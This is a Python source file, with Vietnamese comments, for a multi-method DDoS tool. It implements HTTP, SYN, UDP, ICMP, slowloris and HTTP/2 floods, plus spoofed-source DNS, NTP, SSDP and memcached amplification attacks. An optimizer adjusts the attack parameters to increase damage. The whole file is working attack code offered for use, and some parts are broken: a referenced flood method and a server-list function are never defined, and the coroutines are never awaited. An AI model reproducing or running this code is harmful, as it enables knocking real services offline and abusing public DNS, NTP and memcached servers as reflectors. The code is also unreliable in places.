import threading
import socket
import random
import time
import logging
import string
import dns.resolver
from scapy.all import *
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass
from concurrent.futures import ThreadPoolExecutor
import requests
import asyncio
import aiohttp

@dataclass
class AttackTarget:
    """Thông tin về target"""
    host: str
    port: int
    proto: str = 'tcp'
    path: str = '/'
    ssl: bool = False

@dataclass
class AttackStats:
    """Thống kê tấn công"""
    packets_sent: int = 0
    bytes_sent: int = 0
    requests_success: int = 0
    requests_failed: int = 0
    start_time: float = 0.0
    
    @property
    def success_rate(self) -> float:
        total = self.requests_success + self.requests_failed
        return self.requests_success / total if total > 0 else 0
        
    @property
    def duration(self) -> float:
        return time.time() - self.start_time
        
    @property
    def packets_per_second(self) -> float:
        return self.packets_sent / self.duration if self.duration > 0 else 0
        
    @property  
    def bytes_per_second(self) -> float:
        return self.bytes_sent / self.duration if self.duration > 0 else 0
        
    @property
    def average_latency(self) -> float:
        return self.total_latency / self.requests_success if self.requests_success > 0 else 0

class DDoSAttack:
    def __init__(self, worker_count: int = 50):
        self.logger = logging.getLogger(__name__)
        self.running = False
        self.stats = AttackStats()
        self.worker_count = worker_count
        self.executor = ThreadPoolExecutor(max_workers=worker_count)
        self.loop = asyncio.new_event_loop()
        
        # Load resource files
        self.user_agents = self._load_user_agents()
        self.wordlist = self._load_wordlist()
        self.dns_servers = self._load_dns_servers()
        
    def start_attack(self, target: str, attack_type: str, duration: int,
                    threads: Optional[int] = None) -> bool:
        """Bắt đầu tấn công DDoS"""
        try:
            if threads:
                self.worker_count = threads
                
            self.running = True
            self.stats = AttackStats(start_time=time.time())
            
            # Parse target
            target_info = self._parse_target(target)
            
            # Select attack method
            # Initialize parameters
            self.current_parameters = {
                'packet_size': 1024,  # Initial packet size
                'delay': 0,  # Initial delay between packets
                'concurrent_connections': self.worker_count,
                'amplification_factor': 1
            }
            
            attack_method = {
                'http-flood': self._http_flood,
                'https-flood': self._https_flood,
                'syn-flood': self._syn_flood,
                'udp-flood': self._udp_flood,
                'dns-amp': self._dns_amplification,
                'ntp-amp': self._ntp_amplification,
                'ssdp-amp': self._ssdp_amplification,
                'slowloris': self._slowloris_attack,
                'tcp-connect': self._tcp_connection_flood,
                'http2-flood': self._http2_flood,
                'icmp-flood': self._icmp_flood,
                'memcached-amp': self._memcached_amplification,
                'tcp-syn-ack': self._tcp_syn_ack_flood
            }.get(attack_type)
            
            if not attack_method:
                raise ValueError(f"Invalid attack type: {attack_type}")
                
            # Start attack threads
            attack_futures = []
            for _ in range(self.worker_count):
                future = self.executor.submit(
                    attack_method,
                    target_info,
                    duration
                )
                attack_futures.append(future)
                
            # Start monitoring threads
            monitor = threading.Thread(
                target=self._monitor_attack,
                args=(duration, attack_futures)
            )
            monitor.daemon = True
            monitor.start()
            
            # Start parameter optimization
            optimizer = threading.Thread(
                target=self._optimize_parameters,
                args=(target_info, duration)
            )
            optimizer.daemon = True
            optimizer.start()
            
            return True
            
        except Exception as e:
            self.logger.error(f"Attack start failed: {str(e)}")
            return False
            
    def stop_attack(self) -> None:
        """Dừng tấn công"""
        self.running = False
        self.executor.shutdown(wait=False)
        
    def get_stats(self) -> Dict:
        """Lấy thống kê tấn công"""
        return {
            'packets_sent': self.stats.packets_sent,
            'bytes_sent': self.stats.bytes_sent,
            'requests_success': self.stats.requests_success,
            'requests_failed': self.stats.requests_failed,
            'success_rate': self.stats.success_rate,
            'duration': self.stats.duration,
            'packets_per_second': self.stats.packets_per_second,
            'bytes_per_second': self.stats.bytes_per_second,
            'running': self.running
        }
        
    async def _http_flood(self, target: AttackTarget, duration: int) -> None:
        """HTTP Flood attack using aiohttp"""
        start_time = time.time()
        timeout = aiohttp.ClientTimeout(total=4)
        
        async with aiohttp.ClientSession(timeout=timeout) as session:
            while self.running and time.time() - start_time < duration:
                try:
                    # Build URL
                    scheme = 'https' if target.ssl else 'http'
                    url = f"{scheme}://{target.host}:{target.port}{target.path}"
                    if '?' not in url:
                        url += '?' + self._random_string()
                        
                    # Add headers
                    headers = {
                        'User-Agent': self._random_useragent(),
                        'Accept': '*/*',
                        'Accept-Language': 'en-US,en;q=0.9',
                        'Accept-Encoding': 'gzip, deflate',
                        'X-Requested-With': self._random_string(),
                        'Connection': 'keep-alive'
                    }
                    
                    async with session.get(url, headers=headers) as response:
                        await response.read()
                        self.stats.requests_success += 1
                        
                    self.stats.packets_sent += 1
                    self.stats.bytes_sent += len(str(headers)) + 200  # Approximate
                    
                except Exception:
                    self.stats.requests_failed += 1
                    continue
                    
    def _syn_flood(self, target: AttackTarget, duration: int) -> None:
        """SYN Flood attack"""
        start_time = time.time()
        
        while self.running and time.time() - start_time < duration:
            try:
                # Create packet
                ip = IP(dst=target.host)
                tcp = TCP(
                    sport=RandShort(),
                    dport=target.port,
                    flags="S",
                    seq=random.randint(0, 65535),
                    window=random.randint(1000, 65535)
                )
                
                # Add randomized options
                tcp.options = [
                    ('MSS', 1460),
                    ('NOP', None),
                    ('WScale', 7),
                    ('NOP', None),
                    ('NOP', None),
                    ('Timestamp', (random.randint(1, 65535), 0)),
                    ('SAckOK', '')
                ]
                
                # Send packet
                send(ip/tcp, verbose=False)
                self.stats.packets_sent += 1
                self.stats.bytes_sent += len(ip) + len(tcp)
                
            except Exception:
                self.stats.requests_failed += 1
                continue
                
    def _udp_flood(self, target: AttackTarget, duration: int) -> None:
        """UDP Flood attack"""
        start_time = time.time()
        
        while self.running and time.time() - start_time < duration:
            try:
                # Create packet with random payload
                payload = self._random_string(random.randint(64, 1024))
                packet = IP(dst=target.host) / UDP(
                    sport=RandShort(),
                    dport=target.port
                ) / Raw(load=payload)
                
                # Send packet
                send(packet, verbose=False)
                self.stats.packets_sent += 1 
                self.stats.bytes_sent += len(packet)
                
            except Exception:
                self.stats.requests_failed += 1
                continue
                
    def _dns_amplification(self, target: AttackTarget, duration: int) -> None:
        """DNS Amplification attack"""
        start_time = time.time()
        
        while self.running and time.time() - start_time < duration:
            try:
                for dns_server in self.dns_servers:
                    # Create DNS query packet
                    ip = IP(dst=dns_server)
                    udp = UDP(dport=53)
                    dns = DNS(
                        rd=1,
                        qd=DNSQR(
                            qname=target.host,
                            qtype="ANY"
                        )
                    )
                    
                    # Spoof source address
                    ip.src = target.host
                    
                    # Send packet
                    send(ip/udp/dns, verbose=False)
                    self.stats.packets_sent += 1
                    self.stats.bytes_sent += len(ip) + len(udp) + len(dns)
                    
            except Exception:
                self.stats.requests_failed += 1
                continue
                
    def _ntp_amplification(self, target: AttackTarget, duration: int) -> None:
        """NTP Amplification attack"""
        start_time = time.time()
        monlist = b'\x17\x00\x03\x2a' + b'\x00' * 4
        
        while self.running and time.time() - start_time < duration:
            try:
                for ntp_server in self._get_ntp_servers():
                    # Create NTP monlist packet
                    ip = IP(dst=ntp_server)
                    udp = UDP(sport=random.randint(1024, 65535), dport=123)
                    payload = Raw(load=monlist)
                    
                    # Spoof source
                    ip.src = target.host
                    
                    # Send packet  
                    send(ip/udp/payload, verbose=False)
                    self.stats.packets_sent += 1
                    self.stats.bytes_sent += len(ip) + len(udp) + len(payload)
                    
            except Exception:
                self.stats.requests_failed += 1
                continue
                
    def _ssdp_amplification(self, target: AttackTarget, duration: int) -> None:
        """SSDP Amplification attack"""
        start_time = time.time()
        ssdp_payload = (
            b'M-SEARCH * HTTP/1.1\r\n'
            b'HOST: 239.255.255.250:1900\r\n'
            b'MAN: "ssdp:discover"\r\n'
            b'MX: 1\r\n'
            b'ST: ssdp:all\r\n\r\n'
        )
        
        while self.running and time.time() - start_time < duration:
            try:
                # Create SSDP packet
                ip = IP(dst='239.255.255.250')
                udp = UDP(sport=random.randint(1024, 65535), dport=1900)
                payload = Raw(load=ssdp_payload)
                
                # Spoof source
                ip.src = target.host
                
                # Send packet
                send(ip/udp/payload, verbose=False)
                self.stats.packets_sent += 1
                self.stats.bytes_sent += len(ip) + len(udp) + len(payload)
                
            except Exception:
                self.stats.requests_failed += 1
                continue
                
    async def _slowloris_attack(self, target: AttackTarget, duration: int) -> None:
        """Slowloris attack"""
        start_time = time.time()
        sockets: List[socket.socket] = []
        
        # Create sockets
        for _ in range(self.worker_count * 10):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((target.host, target.port))
                
                # Send partial HTTP request
                s.send(
                    f"GET /?{self._random_string()} HTTP/1.1\r\n"
                    f"Host: {target.host}\r\n"
                    f"User-Agent: {self._random_useragent()}\r\n"
                    "Accept: */*\r\n".encode()
                )
                
                sockets.append(s)
                self.stats.packets_sent += 1
                
            except Exception:
                self.stats.requests_failed += 1
                continue
                
        # Keep sockets alive
        while self.running and time.time() - start_time < duration:
            for s in list(sockets):
                try:
                    s.send(f"X-a: {self._random_string()}\r\n".encode())
                    self.stats.packets_sent += 1
                except Exception:
                    sockets.remove(s)
                    self.stats.requests_failed += 1
                    
                    # Replace failed socket
                    try:
                        new_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        new_socket.settimeout(4)
                        new_socket.connect((target.host, target.port))
                        new_socket.send(b"GET / HTTP/1.1\r\n")
                        sockets.append(new_socket)
                        self.stats.packets_sent += 1
                    except:
                        continue
                        
            time.sleep(10)
            
        # Cleanup
        for s in sockets:
            try:
                s.close()
            except:
                pass
                
    def _tcp_connection_flood(self, target: AttackTarget, duration: int) -> None:
        """TCP Connection Flood attack"""
        start_time = time.time()
        
        while self.running and time.time() - start_time < duration:
            try:
                # Create socket
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                
                # Connect
                s.connect((target.host, target.port))
                self.stats.packets_sent += 1
                
                # Optional: Send some data
                s.send(self._random_string().encode())
                self.stats.bytes_sent += 64
                
                # Don't close socket
                time.sleep(1)
                
            except Exception:
                self.stats.requests_failed += 1
                continue
                
    def _http2_flood(self, target: AttackTarget, duration: int) -> None:
        """HTTP/2 Flood attack"""
        start_time = time.time()
        
        try:
            import h2.connection
            import h2.config
            
            while self.running and time.time() - start_time < duration:
                try:
                    # Setup HTTP/2 connection
                    config = h2.config.H2Configuration(client_side=True)
                    conn = h2.connection.H2Connection(config=config)
                    
                    # Send multiple streams
                    for _ in range(10):
                        stream_id = conn.get_next_available_stream_id()
                        headers = [
                            (':method', 'GET'),
                            (':path', target.path + '?' + self._random_string()),
                            (':scheme', 'https'),
                            (':authority', target.host),
                            ('user-agent', self._random_useragent())
                        ]
                        conn.send_headers(stream_id, headers)
                        
                        # Send random data frames
                        data = self._random_string(self.current_parameters['packet_size']).encode()
                        conn.send_data(stream_id, data)
                        
                        self.stats.packets_sent += 1
                        self.stats.bytes_sent += len(data)
                        
                except Exception:
                    self.stats.requests_failed += 1
                    continue
                    
                time.sleep(self.current_parameters['delay'])
                    
        except ImportError:
            self.logger.error("HTTP/2 support not available")
            
    def _icmp_flood(self, target: AttackTarget, duration: int) -> None:
        """ICMP Flood attack"""
        start_time = time.time()
        
        while self.running and time.time() - start_time < duration:
            try:
                # Create ICMP packet with random payload
                payload = self._random_string(self.current_parameters['packet_size'])
                packet = IP(dst=target.host)/ICMP()/Raw(load=payload)
                
                # Send packet
                send(packet, verbose=False)
                self.stats.packets_sent += 1
                self.stats.bytes_sent += len(packet)
                
                time.sleep(self.current_parameters['delay'])
                
            except Exception:
                self.stats.requests_failed += 1
                continue
                
    def _memcached_amplification(self, target: AttackTarget, duration: int) -> None:
        """Memcached Amplification attack"""
        start_time = time.time()
        stats_payload = b"\x00\x01\x00\x00\x00\x01\x00\x00stats\r\n"
        
        while self.running and time.time() - start_time < duration:
            try:
                # Get memcached servers from list or scan
                servers = self._get_memcached_servers()
                
                for server in servers:
                    # Create UDP packet
                    packet = IP(dst=server)/UDP(
                        sport=random.randint(1024, 65535),
                        dport=11211
                    )/Raw(load=stats_payload)
                    
                    # Spoof source
                    packet[IP].src = target.host
                    
                    # Send packet
                    send(packet, verbose=False)
                    self.stats.packets_sent += 1
                    self.stats.bytes_sent += len(packet)
                    
                time.sleep(self.current_parameters['delay'])
                
            except Exception:
                self.stats.requests_failed += 1
                continue
                
    def _tcp_syn_ack_flood(self, target: AttackTarget, duration: int) -> None:
        """TCP SYN-ACK Flood attack"""
        start_time = time.time()
        
        while self.running and time.time() - start_time < duration:
            try:
                # Create SYN-ACK packet
                packet = IP(dst=target.host)/TCP(
                    sport=random.randint(1024, 65535),
                    dport=target.port,
                    flags='SA',
                    seq=random.randint(0, 65535),
                    ack=random.randint(0, 65535),
                    window=random.randint(1000, 65535)
                )
                
                # Add TCP options
                packet[TCP].options = [
                    ('MSS', 1460),
                    ('NOP', None),
                    ('WScale', 7),
                    ('NOP', None),
                    ('NOP', None),
                    ('Timestamp', (random.randint(1, 65535), 0)),
                    ('SAckOK', '')
                ]
                
                # Send packet
                send(packet, verbose=False)
                self.stats.packets_sent += 1
                self.stats.bytes_sent += len(packet)
                
                time.sleep(self.current_parameters['delay'])
                
            except Exception:
                self.stats.requests_failed += 1
                continue
                
    def _optimize_parameters(self, target: AttackTarget, duration: int) -> None:
        """Tự động tối ưu parameters dựa trên hiệu quả tấn công"""
        start_time = time.time()
        window_size = 5  # Số giây cho mỗi window đánh giá
        
        while self.running and time.time() - start_time < duration:
            time.sleep(window_size)
            
            try:
                # Calculate metrics
                success_rate = self.stats.success_rate
                packets_per_sec = self.stats.packets_per_second
                bytes_per_sec = self.stats.bytes_per_second
                
                # Adjust packet size
                if success_rate > 0.8:
                    self.current_parameters['packet_size'] = min(
                        self.current_parameters['packet_size'] * 1.2,
                        4096  # Max packet size
                    )
                elif success_rate < 0.4:
                    self.current_parameters['packet_size'] = max(
                        self.current_parameters['packet_size'] * 0.8,
                        64  # Min packet size
                    )
                    
                # Adjust delay
                if packets_per_sec > 1000:
                    self.current_parameters['delay'] = max(
                        self.current_parameters['delay'] + 0.001,
                        0.1  # Max delay
                    )
                elif packets_per_sec < 100:
                    self.current_parameters['delay'] = max(
                        self.current_parameters['delay'] - 0.001,
                        0  # Min delay
                    )
                    
                # Adjust concurrent connections
                if success_rate > 0.9:
                    self.current_parameters['concurrent_connections'] = min(
                        self.current_parameters['concurrent_connections'] * 1.2,
                        200  # Max connections
                    )
                elif success_rate < 0.3:
                    self.current_parameters['concurrent_connections'] = max(
                        self.current_parameters['concurrent_connections'] * 0.8,
                        10  # Min connections
                    )
                    
                self.logger.debug(
                    f"Parameters optimized - "
                    f"Packet size: {self.current_parameters['packet_size']}, "
                    f"Delay: {self.current_parameters['delay']}, "
                    f"Connections: {self.current_parameters['concurrent_connections']}"
                )
                
            except Exception as e:
                self.logger.error(f"Parameter optimization error: {str(e)}")
                continue
                
    def _monitor_attack(self, duration: int, futures: List) -> None:
        """Monitor attack progress"""
        start_time = time.time()
        
        while self.running and time.time() - start_time < duration:
            time.sleep(1)
            
            # Check futures
            completed = sum(1 for f in futures if f.done())
            if completed == len(futures):
                self.running = False
                break
                
            # Log stats
            self.logger.info(
                f"Attack stats - "
                f"Packets: {self.stats.packets_sent}, "
                f"Bytes: {self.stats.bytes_sent}, "
                f"Success rate: {self.stats.success_rate:.2%}"
            )
            
        self.running = False
        
    def _parse_target(self, target: str) -> AttackTarget:
        """Parse target string"""
        try:
            if '://' in target:
                proto, rest = target.split('://')
                ssl = proto == 'https'
            else:
                proto = 'tcp'
                rest = target
                ssl = False
                
            if '/' in rest:
                host_port, path = rest.split('/', 1)
                path = '/' + path
            else:
                host_port = rest
                path = '/'
                
            if ':' in host_port:
                host, port = host_port.split(':')
                port = int(port)
            else:
                host = host_port
                port = 443 if ssl else 80
                
            return AttackTarget(
                host=host,
                port=port,
                proto=proto,
                path=path,
                ssl=ssl
            )
            
        except Exception as e:
            raise ValueError(f"Invalid target format: {str(e)}")
            
    def _load_user_agents(self) -> List[str]:
        """Load user agent list"""
        try:
            with open('resources/user_agents.txt') as f:
                return f.read().splitlines()
        except:
            return [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15",
                "Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36"
            ]
            
    def _load_wordlist(self) -> List[str]:
        """Load word list for random strings"""
        try:
            with open('resources/wordlist.txt') as f:
                return f.read().splitlines()
        except:
            return None
            
    def _load_dns_servers(self) -> List[str]:
        """Load DNS server list"""
        try:
            with open('resources/dns_servers.txt') as f:
                return f.read().splitlines()
        except:
            return [
                '8.8.8.8',
                '8.8.4.4',
                '208.67.222.222',
                '208.67.220.220'
            ]
            
    def _get_ntp_servers(self) -> List[str]:
        """Get NTP server list"""
        try:
            with open('resources/ntp_servers.txt') as f:
                return f.read().splitlines()
        except:
            return [
                'pool.ntp.org',
                'time.windows.com',
                'time.apple.com',
                'time.google.com'
            ]
            
    def _random_string(self, length: Optional[int] = None) -> str:
        """Generate random string"""
        if not length:
            length = random.randint(8, 32)
            
        if self.wordlist:
            return random.choice(self.wordlist)
            
        letters = string.ascii_letters + string.digits
        return ''.join(random.choice(letters) for _ in range(length))
        
    def _random_useragent(self) -> str:
        """Get random user agent"""
        return random.choice(self.user_agents)